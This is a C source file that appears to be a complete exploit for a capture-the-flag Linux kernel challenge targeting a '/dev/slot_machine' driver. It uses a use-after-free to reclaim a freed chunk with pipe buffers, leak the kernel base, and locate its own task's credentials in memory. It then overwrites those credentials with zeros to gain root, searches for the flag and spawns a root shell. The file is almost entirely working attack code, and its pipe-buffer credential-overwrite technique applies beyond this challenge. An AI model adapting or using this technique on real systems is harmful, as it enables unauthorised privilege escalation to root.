#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

// good writeups:
// https://soez.github.io/posts/Bluefrost-challenge-EKOPARTY_2022/#!
// https://gist.github.com/soez/9a741258857c1f2e7d0f0933030cd1ea

struct ioctl_req {
	unsigned long offset;
	unsigned long size;
	void *ptr;
};

struct pipe_buffer {
	unsigned long page;
	unsigned int offset, len;
	const void *ops;
	unsigned int flags;
	unsigned long _private;
};

#define PIPE_MAX 32

#define PIPE_READ 0
#define PIPE_WRITE 1
#define PIPE_BUF_FLAG_CAN_MERGE	0x10

// array to hold pipe fds
int g_pipes_arr[PIPE_MAX][2];

unsigned long g_leaked_anon_pipe_buf_ops;
unsigned long g_leaked_page_ptr;

void allocate_pipes(void) {
	printf("[*] Allocating pipes ...\n");
	for (int i = 0; i < PIPE_MAX; i++) {
		if (pipe(g_pipes_arr[i]) == -1) {
			perror("pipe");
			exit(-1);
		}
	}
}

void slots_read(int fd, unsigned long* buf, unsigned int size) {
	struct ioctl_req read_req;

	read_req.offset = 0;
	read_req.size = size;
	read_req.ptr = buf;

	if (ioctl(fd, 1337, &read_req) < 0) {
		perror("ioctl read");
		return;
	}
}

void slots_write(int fd, unsigned long *buf, unsigned int size) {
	struct ioctl_req write_req;

	// Read it back
	write_req.offset = 0;
	write_req.size = size;
	write_req.ptr = buf;

	if (ioctl(fd, 3, &write_req) < 0) {
		perror("ioctl write");
		return;
	}
}

void slots_free_chunk(int fd) {
	if (ioctl(fd, 1, 0) < 0) {
		perror("ioctl free");
		return;
	}
}

void write_to_pipe(unsigned long *buf, unsigned int size, int pipe_idx) {
	write(g_pipes_arr[pipe_idx][PIPE_WRITE], buf, size);
}

void read_from_pipe(unsigned long *buf, unsigned int size, int pipe_idx) {
	read(g_pipes_arr[pipe_idx][PIPE_READ], buf, size);
}

int find_victim_pipe_idx(int fd) {
	unsigned long read_buf[64];
	unsigned long write_buf[64];

	int victim_pipe_idx = -1;

	for (int pipe_idx = 0; pipe_idx < PIPE_MAX; pipe_idx++) {

		// reset read_buf
		memset((unsigned char *) &read_buf[0], 0x0, 64);

		// write to pipe
		memset((unsigned char *) &write_buf[0], 0x42, 64);
		write_to_pipe(write_buf, 64, pipe_idx);

		// read from slot
		slots_read(fd, read_buf, 64);

		// check if the victim chunk was reclaimed
		if (read_buf[2] != 0) {
			victim_pipe_idx = pipe_idx;
			printf("[+] found victim pipe idx: %d\n", victim_pipe_idx);
			g_leaked_page_ptr = read_buf[0];
			g_leaked_anon_pipe_buf_ops = read_buf[2];
			break;
		}
	}

	return victim_pipe_idx;
}

int find_creds(int fd, int victim_pipe_idx, unsigned long *arg_creds, unsigned long *arg_page_creds) {

	unsigned long read_buf[4096];

	char *name = "exp1337";
	prctl(PR_SET_NAME, name, 0, 0, 0);

	unsigned long vmemmap_base = g_leaked_page_ptr & 0xfffffffff0000000;
	printf("[+] vmemmap_base = 0x%lx\n", vmemmap_base);

	short found_creds = 0;
	for (int iter = 0; iter < 10000; ++iter) {

		// write prepared pipe buffer to slot
		struct pipe_buffer pipe;
		pipe.page = vmemmap_base + (0x40 * iter);
		pipe.offset = 0;
		pipe.len = 4096 + 1; // to avoid release, since we are reading 4096 bytes below and do not want to drain the pipe completely
		pipe.ops = (void *) g_leaked_anon_pipe_buf_ops;
		pipe.flags = PIPE_BUF_FLAG_CAN_MERGE;
		pipe._private = 0;
		slots_write(fd, (unsigned long *) &pipe, sizeof(struct pipe_buffer));

		// read from pipe
		memset((unsigned char *) &read_buf[0], 0x00, 4096);
		read_from_pipe(read_buf, 4096, victim_pipe_idx);

		// look if we can find our task's name "exp1337" on the read page
		char *off = memmem(read_buf, 4096, name, strlen(name));

		if (off) {
			unsigned long off_name_in_buf = (int) ((void *) off - (void *) &read_buf[0]);
			unsigned long creds = read_buf[(off_name_in_buf - 0x8) / 8];
			unsigned long real_creds = read_buf[(off_name_in_buf - 0x10) / 8];

			if (creds == real_creds) {
				*arg_creds = creds;
				*arg_page_creds = vmemmap_base + ( (creds & 0xfffffff ) >> 12 ) * 0x40;
				found_creds = 1;
				break;
			}
		}
	}

	return found_creds;
}

void escalate_priveleges(int fd, int victim_pipe_idx, unsigned long creds, unsigned long page_creds) {

	// overwrite credentials

	// write to slot
	unsigned long write_buf[4096];
	memset((unsigned char *) &write_buf[0], 0x0, 4096);
	struct pipe_buffer pipe;

	// write prepared pipe buffer to slot such that writing into the pipe overwrites our task's credentials
	pipe.page = page_creds;
	pipe.offset = (creds & 0xfff) + 4;
	pipe.len = 0;
	pipe.ops = (void *) g_leaked_anon_pipe_buf_ops;
	pipe.flags = PIPE_BUF_FLAG_CAN_MERGE;
	pipe._private = 0;
	slots_write(fd, (unsigned long *) &pipe, sizeof(struct pipe_buffer));

	printf("[*] Overwriting our task's credentials with zeros...\n");

	// now that we have prepared the pipe buffer, write to the pipe to overwrite 0x20 bytes of the cred structure with 0x00
	write_to_pipe(write_buf, 0x20, victim_pipe_idx);
}

void find_flag(int fd, int victim_pipe_idx) {

	unsigned long read_buf[4096];

	printf("[*] Coming back to the CTF challenge... Iterating through vmemmap, reading from pages, and looking for the flag ...\n");

	unsigned long vmemmap_base = g_leaked_page_ptr & 0xfffffffff0000000;

	for (int iter = 0; iter < 10000; ++iter) {

		// write prepared pipe buffer to slot
		struct pipe_buffer pipe;
		pipe.page = vmemmap_base + (0x40 * iter);
		pipe.offset = 0;
		pipe.len = 4096 + 1; // to avoid release, since we are reading 4096 bytes below and do not want to drain the pipe completely
		pipe.ops = (void *) g_leaked_anon_pipe_buf_ops;
		pipe.flags = PIPE_BUF_FLAG_CAN_MERGE;
		pipe._private = 0;
		slots_write(fd, (unsigned long *) &pipe, sizeof(struct pipe_buffer));

		// read from pipe pipe
		memset((unsigned char *) &read_buf[0], 0x00, 4096);
		read_from_pipe(read_buf, 4096, victim_pipe_idx);

		for (int i = 0; i < 4096 / 4; ++i) {
			// look for "TFCC", since the flag has the format "TFCCTF{...}"
			if ( ((unsigned int *)&read_buf[0])[i] == 0x43434654 ) {
				printf("[+] Found the flag: %s\n", (char *) &((unsigned int *)&read_buf[0])[i]);
				return;
			}
		}
	}
}

int main() {
	unsigned long read_buf[4096];
	unsigned long write_buf[4096];

	// allocate pipes
	allocate_pipes();

	int fd = open("/dev/slot_machine", O_RDWR);

	if (fd == -1) {
		perror("Error opening /dev/slot_machine\n");
		return 1;
	}

	// allocate a chunk
	int n = 2;
	unsigned long size = n * sizeof(struct pipe_buffer);
	if (ioctl(fd, 0, &size) < 0) {
		perror("ioctl alloc");
		return 1;
	}

	// write to slot
	memset((unsigned char *) &write_buf[0], 0x41, 64);
	slots_write(fd, write_buf, 64);

	// free the chunk
	slots_free_chunk(fd);

	// reclaim
	for (int i = 0; i < PIPE_MAX; i++) {
		fcntl(g_pipes_arr[i][1], F_SETPIPE_SZ, 4096 * n);
	}

	printf("[*] Writing to each pipe and checking if the victim chunk was reclaimed by a pipe buffer ...\n");
	int victim_pipe_idx = find_victim_pipe_idx(fd);
	if (victim_pipe_idx == -1) {
		printf("[-] Couldn't find the victim pipe idx => exploit failed\n");
		return 1;
	}

	const unsigned long kernel_base_addr = g_leaked_anon_pipe_buf_ops - 0xffffffff816128c0 + 0xffffffff81000000;
	printf("[+] kernel base: %lx\n", kernel_base_addr);

	unsigned long tmp_creds, tmp_page_creds;
	int tmp_found_creds = find_creds(fd, victim_pipe_idx, &tmp_creds, &tmp_page_creds);

	if (tmp_found_creds) {
		printf("[+] found creds: creds = 0x%lx, page_creds = 0x%lx\n", tmp_creds, tmp_page_creds);
	} else {
		printf("[-] Didn't find creds => exploit failed\n");
		return 1;
	}

	escalate_priveleges(fd, victim_pipe_idx, tmp_creds, tmp_page_creds);

	if (getuid() == 0) {
		printf("[+] Became successfully root! getuid() = %d\n", getuid());
	} else {
		printf("[-] Failed to get root. getuid() = %d\n", getuid());
	}

	find_flag(fd, victim_pipe_idx);

	// clean up
	close(fd);
	for (int i = 0; i < PIPE_MAX; i++) {
		close(g_pipes_arr[i][0]);
		close(g_pipes_arr[i][1]);
	}

	// root shell
	printf("[+] Now enjoy your root shell :-)\n");
	system("/bin/sh");


}
